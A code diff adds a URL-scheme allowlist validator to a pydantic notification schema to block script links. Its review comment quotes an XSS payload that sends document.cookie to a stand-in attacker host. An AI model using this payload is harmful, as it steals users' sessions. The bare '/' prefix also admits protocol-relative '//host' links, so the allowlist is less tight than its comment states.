@@ -3,17 +3,38 @@
 import uuid
 from datetime import datetime
 
-from pydantic import BaseModel, Field
+from pydantic import BaseModel, Field, field_validator
+
+
+# HIGH-1 (sprint-4 security review): block dangerous URL schemes at the
+# DTO boundary. Without this guard, an admin could embed
+# `javascript:fetch('https://attacker/?'+document.cookie)` and any
+# learner who clicks the bell-icon item triggers SPA-origin script
+# execution. The frontend re-validates as defence in depth
+# (NotificationCenter.vue#safeLinkHref) so a future schema regression
+# cannot bypass the click-time check.
+_ALLOWED_LINK_PREFIXES = ("https://", "http://", "/")
 
 
 class NotificationCreate(BaseModel):
     recipient_user_id: uuid.UUID
     title: str = Field(min_length=1, max_length=200)
     body: str = Field(min_length=1, max_length=2000)
-    # `link` is optional and free-form (frontend resolves it as a
-    # router path). Validation here is length only — the frontend
-    # decides at click time whether to follow it.
+    # `link` is optional. It must be either a relative SPA path (starts
+    # with "/") or a fully-qualified http(s) URL — never javascript:,
+    # data:, vbscript:, file:, or other script-eligible schemes.
     link: str | None = Field(default=None, max_length=500)
+
+    @field_validator("link")
+    @classmethod
+    def link_scheme_allowlist(cls, v: str | None) -> str | None:
+        if v is None or v == "":
+            return None
+        if not any(v.startswith(p) for p in _ALLOWED_LINK_PREFIXES):
+            raise ValueError(
+                "link must be a relative path (/...) or an http/https URL"
+            )
+        return v
 
 
 class NotificationOut(BaseModel):
